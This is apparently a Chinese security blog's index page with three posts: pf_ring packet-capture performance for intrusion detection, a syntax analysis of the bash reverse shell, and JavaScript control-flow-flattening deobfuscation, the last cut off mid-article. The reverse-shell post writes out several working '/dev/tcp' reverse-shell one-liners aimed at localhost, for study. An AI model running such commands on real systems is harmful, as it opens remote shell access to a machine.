<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"yoursite.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="leveryd的个人博客">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="leveryd的个人博客">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="leveryd">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://yoursite.com/page/5/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/5/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>leveryd的个人博客</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">leveryd的个人博客</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">leveryd</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">62</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">23</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%85%A8%E6%B5%81%E9%87%8F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021-12-26-%E5%85%A8%E6%B5%81%E9%87%8F%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">全流量入侵检测系统的性能分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>16年在房多多的时候参与开发nids，用<a target="_blank" rel="noopener" href="https://github.com/bro/bro">bro</a>来做抓包、解包和规则引擎。</p>
<p>当时对bro解析http的成功率做测试，生产环境中发现差不多有10%-20%的http请求并没有解析成功。</p>
<p>我当时的测试思路如下：</p>
<ul>
<li>客户端发送http请求，请求中带有特殊标记</li>
<li>统计bro http日志中有带有标记的数量</li>
</ul>
<p>10%-20%的解析失败，意味着有可能有攻击行为没有检测到。因此需要提升http流量解析的成功率。</p>
<p>当时在网上也搜到一些提升抓包性能的方案，比如pf_ring、dpdk等。不过当时理解不了原理，最近补了一些网络方面的知识，所以就来回顾一下这个案例。</p>
<p>我主要想弄清楚以下问题：</p>
<ul>
<li>pf_ring真的能提高抓包性能么？</li>
<li>pf_ring为什么能提高性能？</li>
</ul>
<p>基于以下两点原因，本文只讨论pf_ring、不讨论dpdk：</p>
<ul>
<li>端口扫描工具masscan支持pf_ring，而不支持dpdk。我后面要分析masscan</li>
<li>精力有限，而pf_ring技术点比dpdk似乎要少一些、简单一点</li>
</ul>
<p>另外本文只讨论 <a target="_blank" rel="noopener" href="https://www.ntop.org/pf_ring/pf_ring-and-transparent-mode/">pf_ring的三种模式</a> 中的默认模式</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
<li><p>先理解一下”问题背景”里场景的性能</p>
<p>从网卡上的流量到bro将http请求写到日志中，可以大概分成三个部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 抓包（包从网卡到用户空间）</span><br><span class="line">* 解包（解析出http、dns、ssh、ftp等应用层协议）</span><br><span class="line">* 写磁盘</span><br></pre></td></tr></table></figure>

<p>这每一步都会有性能损耗，但是性能损耗的占比可能不同。所以仅提升”抓包”这一部分的性能有可能并不能提升整体性能。</p>
<p>用一些性能工具（比如perf）结合代码 应该可以看出来bro每个阶段的cpu消耗占比。</p>
<p>这篇文章只关注”抓包”这个环节的性能。</p>
</li>
<li><p>为什么会丢包？</p>
<p>丢包的原因太多了，在<code>网络传输 -&gt; 网卡 -&gt; 驱动 -&gt; 内核sk_buff -&gt; tcp/ip协议栈 -&gt; 用户态</code>每一个环节都有可能丢包。</p>
<p>可以看 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/256428917">图解Linux网络包接收过程</a> 这篇文章了解完整的收包过程。</p>
<p>关于”排查各个环节丢包的工具和思路”，由于没有实践过多少，这里就不推荐啥文章了。</p>
</li>
<li><p>抓包过程中的性能和哪些因素有关？</p>
<p>目前我理解的主要和三个方面有关：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 内存拷贝的次数</span><br><span class="line">* 内核处理网卡中断的频率</span><br><span class="line">* 系统调用产生的中断次数</span><br></pre></td></tr></table></figure>

<p>所以pf_ring做了以下事情：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 通过mmap映射，减少了一次内存拷贝</span><br><span class="line">* 通过napi机制减少内核响应网卡硬中断的次数</span><br><span class="line">* 也因为mmap映射，用户层不需要频繁地通过recvfrom等系统调用获取网络包</span><br></pre></td></tr></table></figure>

<p>如果想了解mmap怎么实现内核态和用户态的内存映射，可以参考 <a target="_blank" rel="noopener" href="https://nieyong.github.io/wiki_cpu/mmap%E8%AF%A6%E8%A7%A3.html">文章中的示例1</a> ，有demo代码可以跑起来。</p>
<p>pf_ring的实现方式和文章中的差不多：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 内核同样会注册mmap函数供用户态调用</span><br><span class="line">* 内核同样会调用&#96;remap_pfn_range&#96;函数来做内存映射</span><br></pre></td></tr></table></figure>

<p>如果想了解napi机制，可以看 <a target="_blank" rel="noopener" href="https://wiki.linuxfoundation.org/networking/napi">napi官方文档</a>。</p>
<p>我对napi的理解：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 它的作用是：将包从网卡放到内核内存</span><br><span class="line">* 如果每次都是网卡产生中断告诉cpu有数据包来了，在流量大的请求下就需要响应中断很多次。napi减少了硬中断的响应次数，所以提升了性能。</span><br><span class="line">* 它由内核驱动实现</span><br></pre></td></tr></table></figure>

<p>如果想了解napi和非napi的实现上的区别，可以参考 <a target="_blank" rel="noopener" href="http://www.hyuuhit.com/2018/07/25/receive-packet/">Linux kernel 链路层帧接收</a> 并对照内核源码分析。此文章简要分析了两个驱动，分别代表了napi实现和非napi实现。</p>
</li>
<li><p>pf_ring真的可以提高libpcap性能么？</p>
<p>新版本的libpcap采用PACKET_MMAP方式收包。</p>
<p>PACKET_MMAP是内核实现的一种机制,发包和收包都可以用这个技术。它同样使用<code>mmap</code>减少了内存拷贝和系统调用，因此提升了性能。</p>
<p>PACKET_MMAP的详细介绍推荐看<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/Documentation/networking/packet_mmap.rst">内核文档</a>，写得比较全（内容比较多，我也没完整过一遍）。</p>
<p>我对”基于pf_ring非零拷贝的libpcap”和”基于packet_mmap的libpcap”对比，结论如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 两者内存拷贝次数一样</span><br><span class="line">* 两者使用相同的驱动，都用到了napi</span><br><span class="line">* 用户态读数据时，基本都不需要经过系统调用</span><br></pre></td></tr></table></figure>

<p>根据这个对比，我觉得”pf_ring非零拷贝模式”应该不会大幅度提高抓包性能。</p>
<p>为了验证自己的结论，就做个实验来看看。</p>
</li>
<li><p>实验验证</p>
<p>在自己实验前，看到 <a target="_blank" rel="noopener" href="http://cea.ceaj.org/CN/article/downloadArticleFile.do?attachType=PDF&id=30309">PF_RING与NAPI结合的捕包性能优化和仿真.pdf</a> 这篇实践文章，推荐阅读。此文章结论是pf_ring可以提高抓包性能</p>
<p>我做的实验过程见公众号中另一篇文章”验证pf_ring性能”，结论是pf_ring可以提高抓包成功率。</p>
<p>实验结果上虽然可以看出来提高抓包成功率，但是看不出来是否有大幅度提升。</p>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实验的结论和我自己对原理的分析并没有对应上，也并没有完全解决我自己一开始想弄清楚的问题。</p>
<p>因为文章中的很多技术我在研究案例之前不怎么知道，另外也没有找到搞网络的大佬愿意帮我校对文章，所以不能保证文章中的结论都是对的。</p>
<p>如果读者发现有什么错误的地方，请公众号后台私信我。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
<li><p>-i 参数</p>
<p>  生成交互式shell</p>
</li>
<li><p><code>&gt;&amp;</code> 是什么？</p>
<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
<ul>
<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
</li>
<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
</li>
</ul>
</li>
<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
<p>  更详细的可以看参考资料</p>
</li>
<li><p><code>0&gt;&amp;1</code> 是什么？</p>
<p>  将标准输入重定向到标准输出</p>
</li>
<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
</li>
</ul>
<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
<li><p>验证<code>&gt;&amp;</code>语法</p>
<p> <code>&amp;&gt;</code>是一种特殊情况</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
<li><p>验证 文件描述符指向 socket</p>
<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>

<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
<p> 比如下面命令反弹shell会有些问题</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
<p> 而下面命令可以反弹shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
<ul>
<li>“&gt;&amp;”的两种用法</li>
<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/" class="post-title-link" itemprop="url">反混淆"控制流平坦化"</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>业务逻辑非常依赖前端的安全产品，比如<a target="_blank" rel="noopener" href="https://www.geetest.com/">极验</a>、<a target="_blank" rel="noopener" href="https://www.dingxiang-inc.com/docs/detail/captcha">顶象-无感验证</a>、瑞数 等都会对前端代码做混淆。其中有一种强度较高的混淆方式，叫”控制流平坦化”。</p>
<blockquote>
<p>“控制流平坦化”是将一些顺序执行的代码，变化成阅读难度更大的<code>while-switch-case</code>或者<code>for-switch-case</code>代码。可以见<a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">ControlFlow</a>这个项目的例子。</p>
</blockquote>
<p>如果能够”反混淆”这种”控制流平坦化”混淆后的代码，就能让代码变得更容易阅读一些。</p>
<p>本文介绍”反控制流平坦化”的思路和实践过程，最终可以反混淆<code>ControlFlow</code>和<code>https://obfuscator.io/</code>两个工具的”控制流平坦化”。</p>
<p>反混淆思路：</p>
<ul>
<li>按照”while-switch-case”执行顺序，拼接case语句</li>
</ul>
<h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><ul>
<li><p>怎么实现？</p>
<p>分为两步：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 第一步获取case块的执行顺序</span><br><span class="line">* 第二部根据case块的执行顺序，拼接case块</span><br></pre></td></tr></table></figure>
</li>
<li><p>怎么获取”case块的执行顺序”？</p>
<p>思路是在每个case块中”注入代码”，然后在浏览器中执行js代码，执行过程”注入代码”就可以记录执行顺序。我理解这个类似”软件测试”中计算”代码覆盖率”时用到的插桩。</p>
<p>原始代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while (!![])&#123;</span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>插桩后,代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 利用&quot;插桩&quot;记录while-switch-case执行顺序</span><br><span class="line">&#x2F;&#x2F; 集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">let while_id_stack &#x3D; []  &#x2F;&#x2F; 栈</span><br><span class="line"></span><br><span class="line">let collection &#x3D; &#123;&#125;</span><br><span class="line"></span><br><span class="line">while (!![])&#123;</span><br><span class="line">  while_statement_id &#x3D; 111</span><br><span class="line">  while_id_stack.push(while_statement_id)</span><br><span class="line">  collection[while_statement_id] &#x3D; []</span><br><span class="line"></span><br><span class="line">  switch (...)&#123;</span><br><span class="line">    case &quot;0&quot;:</span><br><span class="line">      case_statement_id &#x3D; 222</span><br><span class="line">      while_id_on_stack_op &#x3D; while_id_stack[while_id_stack.length-1]</span><br><span class="line">      collection[while_id_on_stack_op].push(case_statement_id)</span><br><span class="line">      ...</span><br><span class="line">    case &quot;1&quot;:</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  while_id_stack.pop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">record(collection)</span><br></pre></td></tr></table></figure>

<p>浏览器运行后，集合中就存放有case节点的执行顺序。</p>
<p>上面都是伪代码，具体实现见 hook.js</p>
</li>
<li><p>怎么拼接case块？</p>
<p>伪代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">集合 &#x3D; &#123;while id: [case1节点, case2节点，case3节点，case2节点]&#125;</span><br><span class="line"></span><br><span class="line">函数1：</span><br><span class="line"></span><br><span class="line">  遍历ast，如果遇到while语句 &#123;</span><br><span class="line">    得到当前while id</span><br><span class="line"></span><br><span class="line">    if while id in 集合:</span><br><span class="line">      顺序拼接各个case块内容</span><br><span class="line"></span><br><span class="line">      用&quot;拼接后的顺序语句&quot;替换&quot;while语句&quot;</span><br><span class="line"></span><br><span class="line">      从集合中删除 while id记录</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">while 集合中还有元素:</span><br><span class="line"></span><br><span class="line">  调用 函数1</span><br></pre></td></tr></table></figure>

<p>具体实现见 simple_decode.js</p>
</li>
</ul>
<h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><p>可以将”while-switch-case代码块”变成”顺序执行的代码块”。</p>
<p>比如 PlayWithObfuscator/tests/encoded_js/simple.js 中的混淆后的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while (!![]) &#123;</span><br><span class="line">    switch (_0xcgcd3c[_0x3922ce++]) &#123;</span><br><span class="line">        case &quot;0&quot;:</span><br><span class="line">            if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">            continue;</span><br><span class="line"></span><br><span class="line">        case &quot;1&quot;:</span><br><span class="line">            _0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br><span class="line">            continue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转换成 阅读性更好一些的代码</p>
